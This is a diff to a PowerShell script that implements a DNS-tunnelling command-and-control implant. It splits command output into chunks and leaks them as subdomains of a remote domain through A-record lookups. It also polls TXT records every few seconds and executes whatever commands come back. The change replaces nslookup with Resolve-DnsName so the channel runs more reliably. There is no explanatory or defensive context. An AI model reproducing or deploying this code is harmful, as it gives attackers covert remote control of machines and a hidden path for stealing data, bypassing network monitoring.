@@ -39,28 +39,29 @@ $string = $string -replace '-','';
 $len = $string.Length;
 $split = 50;
 $repeat=[Math]::Floor($len/$split);
-$remainder=$len%%$split;
+$remainder=$len%$split;
 if($remainder){ $repeatr = $repeat+1};
 $rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
-$q = nslookup -querytype=A $ur;
+$q = resolve-dnsname -type 1 $ur;
 for($i=0;$i-lt$repeat;$i++){
     $str = $string.Substring($i*$Split,$Split);
     $rnd = Get-Random;$ur1 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
-    $q = nslookup -querytype=A $ur1;
+    $q = resolve-dnsname -type 1 $ur1;
 };
 if($remainder){
     $str = $string.Substring($len-$remainder);
     $i = $i +1
     $rnd = Get-Random;$ur2 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
-    $q = nslookup -querytype=A $ur2;
+    $q = resolve-dnsname -type 1 $ur2;
 };
-$rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s;
+$rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = resolve-dnsname -type 1 $s;
 };
 while (1){
    $c = Get-Random;
    Start-Sleep -s 3
-   $u=$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
-   $txt = $txt.split("`n") | %%{$_.split('"')[1]} | Out-String
+   $u=$c.ToString()+"."+$url;$txt = resolve-dnsname -type 16 -dnsonly $u | select-object Strings | Out-String
+   $txt = $txt.split("`n") | %{$_.split('{')[1]} | Out-String
+   $txt = $txt.split("`n") | %{$_.split('}')[0]} | Out-String
    if ($txt -match 'NoCMD'){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
